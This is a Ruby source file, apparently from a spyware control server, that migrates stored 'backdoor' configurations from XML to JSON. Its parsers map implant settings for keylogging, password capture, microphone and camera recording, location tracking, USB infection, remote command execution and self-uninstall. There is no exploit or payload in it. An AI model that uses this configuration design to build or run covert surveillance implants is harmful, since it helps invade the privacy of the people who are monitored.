require 'rcs-db/db_layer'
require 'xmlsimple'
require 'json'

module RCS
module DB

class ConfigMigration
  extend Tracer

  class << self

    def migrate(verbose)

      print "Migrating backdoors' configurations "

      configs = DB.instance.mysql_query('SELECT * from `config` WHERE `backdoor_id` IS NOT NULL ORDER BY `config_id`;').to_a
      configs.each do |config|

        backdoor = Item.where({_mid: config[:backdoor_id]}).any_in(_kind: ['backdoor', 'factory']).first

        # skip item if already migrated
        next unless backdoor.configs.where({_mid: config[:config_id]}).first.nil?

        trace :info, "Migrating config  for '#{backdoor[:name]}'." if verbose

        mc = ::Configuration.new
        mc[:_mid] = config[:config_id]
        mc.desc = config[:desc]
        mc.user = config[:user]
        mc.saved = config[:saved].to_i
        mc.sent = config[:sent].to_i if config[:sent].to_i != 0

        mc.config = xml_to_json(config[:content])

        # migrate the complete config history
        if backdoor[:_kind] == 'backdoor'
          backdoor.configs << mc
          print "." unless verbose
        end

        # factories does not have history
        if backdoor[:_kind] == 'factory'
          backdoor.configs = [ mc ]
          print "." unless verbose
        end

        backdoor.save

      end

      puts " done."

    end

    def migrate_templates(verbose)

      print "Migrating configuration templates "

      templates = DB.instance.mysql_query('SELECT * from `config` WHERE `backdoor_id` IS NULL ORDER BY `config_id`;').to_a
      templates.each do |template|

        # skip item if already migrated
        next if Template.count(conditions: {_mid: template[:config_id]}) != 0

        trace :info, "Migrating template '#{template[:desc]}'." if verbose
        print "." unless verbose

        mt = ::Template.new
        mt[:_mid] = template[:config_id]
        mt.desc = template[:desc]
        mt.user = template[:user]

        mt.config = xml_to_json(template[:content])

        mt.save
      end

      puts " done."
    end

    def parse_globals(items)
      globals = {}
      items.each_pair do |key, value|
        if key == 'quota' then
          globals[:quota] = {:min => value.first['mindisk'], :max => value.first['maxlog']}
          globals[:wipe] = value.first['wipe'] == 'false' ? false : true
        end
        if key == 'template' then
          globals[:type] = value.first['type']
        end
      end
      globals[:version] = 20111231
      globals[:nohide] = []
      
      return globals
    end

    def parse_events(items)
      events = []

      return events if items.nil?

      items.each do |item|
        e = {}
        e[:start] = item['action'].to_i
        e[:repeat] = -1
        e[:end] = -1
        (item.keys.delete_if {|x| x == 'action' or x == 'actiondesc'}).each do |ev|
          e[:event] = ev
          params = item[ev].first
          e[:end] = params['endaction'].to_i unless params['endaction'].nil?
          case ev
            when 'process'
              e[:window] = params['window'] == 'false' ? false : true
              e[:focus] = params['focus'] == 'false' ? false : true
              e[:process] = params['content']
            when 'screensaver', 'ac', 'simchange', 'standby'
              # no parameters
            when 'connection'
              e.merge! params
              e['port'] = e['port'].to_i
            when 'connectivity'
              # rename to connection
              e[:event] = 'connection'
            when 'winevent'
              e.merge! params
              e['id'] = e['id'].to_i
            when 'battery'
              e[:min] = params['min'].to_i
              e[:max] = params['max'].to_i
            when 'call'
              e[:number] = params['number']
            when 'quota'
              e[:quota] = params['size'].to_i
            when 'location'
              e[:type] = params['type']
              e[:latitude] = params['latitude'].to_f unless params['latitude'].nil?
              e[:longitude] = params['longitude'].to_f unless params['longitude'].nil?
              e[:distance] = params['distance'].to_i unless params['distance'].nil?
              e[:id] = params['id'].to_i unless params['id'].nil?
              e[:country] = params['country'].to_i unless params['country'].nil?
              e[:network] = params['network'].to_i unless params['network'].nil?
              e[:area] = params['area'].to_i unless params['area'].nil?
            when 'sms'
              e[:number] = params['number']
              e[:text] = params['text']
            when 'timer'
              e[:type] = params['type']
              case e[:type]
                when 'date'
                  e[:date] = params['content']
                when 'daily'
                  e[:hour_from] = params['hour'].first.to_i
                  e[:minute_from] = params['minute'].first.to_i
                  e[:second_from] = params['second'].first.to_i
                  e[:hour_to] = params['endhour'].first.to_i
                  e[:minute_to] = params['endminute'].first.to_i
                  e[:second_to] = params['endsecond'].first.to_i
                when 'loop', 'after startup'
                  e[:hour] = params['hour'].first.to_i
                  e[:minute] = params['minute'].first.to_i
                  e[:second] = params['second'].first.to_i
                when 'after install'
                  e[:days] = params['day'].first.to_i
              end
            else
              raise 'unknown event: ' + ev
          end
        end
        events << e
      end

      return events
    end

    def parse_actions(items)
      actions = []

      return actions if items.nil?

      items.each do |item|
        a = {}
        a[:desc] = item['description']
        a[:subactions] = []
        # each subaction
        (item.keys.delete_if {|x| x == 'number' or x == 'description'}).each do |sub|
          item[sub].each do |s|

            subaction = {:action => sub}

            case sub
              when 'synchronize'
                subaction[:stop] = false
                subaction['type'] = 'internet' if s['type'].nil?
                subaction.merge! s
              when 'sms'
                subaction.merge! s
              when 'log'
                subaction[:text] = s
              when 'execute'
                subaction[:command] = s
              when 'uninstall'
                # no parameters
              when 'agent'
                subaction[:status] = s['action']
                subaction[:agent] = s['name']
              else
                raise "unknown subaction: " + sub
            end
            a[:subactions] << subaction
          end
        end
        actions << a
      end

      return actions
    end

    def parse_agents(items)
      agents = []

      return agents if items.nil?

      items.each do |item|
        a = {}
        a[:agent] = (item.keys.delete_if {|x| x == 'enabled'}).first
        a[:enabled] = item['enabled'] == 'false' ? false : true
        case a[:agent]
          when 'application', 'chat', 'clipboard', 'keylog', 'organizer', 'password', 'calllist'
            # no parameters
          when 'call', 'device', 'camera', 'mic', 'mouse', 'position', 'print', 'url', 'snapshot', 'conference', 'livemic'
            a.merge! item[a[:agent]].first
          when 'crisis'
            t = item[a[:agent]].first
            a[:network] = {:enabled => t['network'].first['enabled'] == 'false' ? false : true,
                           :processes => t['network'].first['process']} unless a[:network].nil?
            a[:hook] = {:enabled => t['hook'].first['enabled'] == 'false' ? false : true,
                        :processes => t['hook'].first['process']} unless a[:hook].nil?
            a[:synchronize] = t['synchronize'] == 'false' ? false : true unless t['synchronize'].nil?
            a[:call] = t['call'] == 'false' ? false : true unless t['call'].nil?
            a[:mic] = t['mic'] == 'false' ? false : true unless t['mic'].nil?
            a[:camera] = t['camera'] == 'false' ? false : true unless t['camera'].nil?
            a[:position] = t['position'] == 'false' ? false : true unless t['position'].nil?
          when 'infection'
            t = item[a[:agent]].first
            a[:local] = t['local'] == 'false' ? false : true
            a[:usb] = t['usb'] == 'false' ? false : true
            # false by default on purpose
            a[:mobile] = false
          when 'file'
            a.merge! item[a[:agent]].first
            a['accept'] = a['accept'].first['mask'] unless a['accept'].nil?
            a['deny'] = a['deny'].first['mask'] unless a['deny'].nil?
          when 'messages'
            item[a[:agent]].each do |mes|
              a.merge! mes
            end
            a['sms'] = a['sms'].first unless a['sms'].nil?
            a['mms'] = a['mms'].first unless a['mms'].nil?
            a['mail'] = a['mail'].first unless a['mail'].nil?
          else
            raise "unknown agent: " + a[:agent]
        end
        agents << a
      end

      return agents
    end

    def xml_to_json(content)

      agents = []
      actions = []
      events = []
      globals = {}

      begin
        xml_config = XmlSimple.xml_in(content)

        xml_config.each do |section|
          case section[0]
            when 'globals'
              globals = parse_globals(section[1].first)
            when 'events'
              events = parse_events(section[1].first['event'])
            when 'actions'
              actions = parse_actions(section[1].first['action'])
            when 'agents'
              agents = parse_agents(section[1].first['agent'])
          end
        end
      rescue Exception => e
        trace :warn, "Invalid config parsing: " + e.message
        trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
      end

      config = {'agents' => agents, 'actions' => actions, 'events' => events, 'globals' => globals}

      return config.to_json
    end


  end
end

end # ::DB
end # ::RCS
